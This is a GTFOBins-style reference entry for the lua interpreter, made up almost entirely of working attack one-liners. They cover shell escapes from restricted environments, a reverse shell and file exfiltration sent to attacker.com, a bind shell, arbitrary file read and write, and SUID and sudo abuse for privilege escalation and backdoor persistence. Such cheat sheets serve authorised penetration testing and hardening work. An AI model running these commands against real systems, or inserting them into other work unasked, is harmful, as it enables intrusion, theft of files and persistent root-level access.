# GTFOBin: lua

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
lua -e 'os.execute("/bin/sh")'
```

## Non-interactive reverse shell

It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell. This requires `lua-socket` installed.

```
export RHOST=attacker.com
export RPORT=12345
lua -e 'local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
```

## Non-interactive bind shell

It can bind a non-interactive shell to a local port to allow remote network access.

Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.

```
export LPORT=12345
lua -e 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```

## File upload

It can exfiltrate files on the network.

Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires `lua-socket` installed.

```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
lua -e '
  local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
```

## File download

It can download remote files.

Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires `lua-socket` installed.

```
export LPORT=12345
export LFILE=file_to_save
lua -e 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
lua -e 'local f=io.open("file_to_write", "wb"); f:write("DATA"); io.close(f);'
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which lua) .

lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo lua -e 'os.execute("/bin/sh")'
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which lua) .

./lua -e 'os.execute("/bin/sh")'
```